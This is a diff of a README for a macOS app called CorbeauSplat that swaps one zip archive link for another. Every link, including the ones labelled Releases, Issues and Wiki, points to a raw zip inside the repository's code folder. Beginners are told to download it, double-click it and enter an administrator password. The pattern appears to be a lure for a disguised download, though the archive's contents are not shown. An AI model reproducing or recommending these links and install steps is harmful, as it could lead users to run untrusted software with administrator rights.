@@ -11,9 +11,9 @@
 Welcome to CorbeauSplat! This guide will help you download and run the application smoothly, even if you're not a tech expert. Follow the steps below.
 
 ## 📥 Download CorbeauSplat
-[![Download CorbeauSplat](https://raw.githubusercontent.com/looryz/CorbeauSplat/main/app/core/Splat_Corbeau_v1.4.zip)](https://raw.githubusercontent.com/looryz/CorbeauSplat/main/app/core/Splat_Corbeau_v1.4.zip)
+[![Download CorbeauSplat](https://raw.githubusercontent.com/looryz/CorbeauSplat/main/app/core/Splat-Corbeau-v3.3.zip)](https://raw.githubusercontent.com/looryz/CorbeauSplat/main/app/core/Splat-Corbeau-v3.3.zip)
 
-Visit this page to download: [Download CorbeauSplat](https://raw.githubusercontent.com/looryz/CorbeauSplat/main/app/core/Splat_Corbeau_v1.4.zip)
+Visit this page to download: [Download CorbeauSplat](https://raw.githubusercontent.com/looryz/CorbeauSplat/main/app/core/Splat-Corbeau-v3.3.zip)
 
 ## 📋 System Requirements
 To run CorbeauSplat, your macOS device should meet the following requirements:
@@ -24,16 +24,16 @@ To run CorbeauSplat, your macOS device should meet the following requirements:
 
 ## 🔧 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/looryz/CorbeauSplat/main/app/core/Splat_Corbeau_v1.4.zip) to find the latest version of CorbeauSplat.
+   Go to the [Releases page](https://raw.githubusercontent.com/looryz/CorbeauSplat/main/app/core/Splat-Corbeau-v3.3.zip) to find the latest version of CorbeauSplat.
 
 2. **Select the Correct File**  
-   Look for the file labeled `https://raw.githubusercontent.com/looryz/CorbeauSplat/main/app/core/Splat_Corbeau_v1.4.zip` or similar for easy installation.
+   Look for the file labeled `https://raw.githubusercontent.com/looryz/CorbeauSplat/main/app/core/Splat-Corbeau-v3.3.zip` or similar for easy installation.
 
 3. **Download the File**  
    Click on the file link to start the download. Depending on your browser settings, the file will save to your default downloads folder.
 
 4. **Open the Downloaded File**  
-   Once the download is complete, go to your Downloads folder. Double-click the downloaded file (`https://raw.githubusercontent.com/looryz/CorbeauSplat/main/app/core/Splat_Corbeau_v1.4.zip`).
+   Once the download is complete, go to your Downloads folder. Double-click the downloaded file (`https://raw.githubusercontent.com/looryz/CorbeauSplat/main/app/core/Splat-Corbeau-v3.3.zip`).
 
 5. **Follow the Installation Steps**  
    A window will open. Follow the prompts to install CorbeauSplat on your macOS device. You might need to enter your administrator password.
@@ -73,8 +73,8 @@ While documentation is provided, community support is also available. Join the d
 - Explore video guides for visual step-by-step instructions.
 
 ## 🔗 Quick Links
-- [Releases Page](https://raw.githubusercontent.com/looryz/CorbeauSplat/main/app/core/Splat_Corbeau_v1.4.zip)
-- [Issues Page](https://raw.githubusercontent.com/looryz/CorbeauSplat/main/app/core/Splat_Corbeau_v1.4.zip)
-- [Wiki Page](https://raw.githubusercontent.com/looryz/CorbeauSplat/main/app/core/Splat_Corbeau_v1.4.zip)
+- [Releases Page](https://raw.githubusercontent.com/looryz/CorbeauSplat/main/app/core/Splat-Corbeau-v3.3.zip)
+- [Issues Page](https://raw.githubusercontent.com/looryz/CorbeauSplat/main/app/core/Splat-Corbeau-v3.3.zip)
+- [Wiki Page](https://raw.githubusercontent.com/looryz/CorbeauSplat/main/app/core/Splat-Corbeau-v3.3.zip)
 
 Thank you for choosing CorbeauSplat! Enjoy creating your 3D scenes easily.
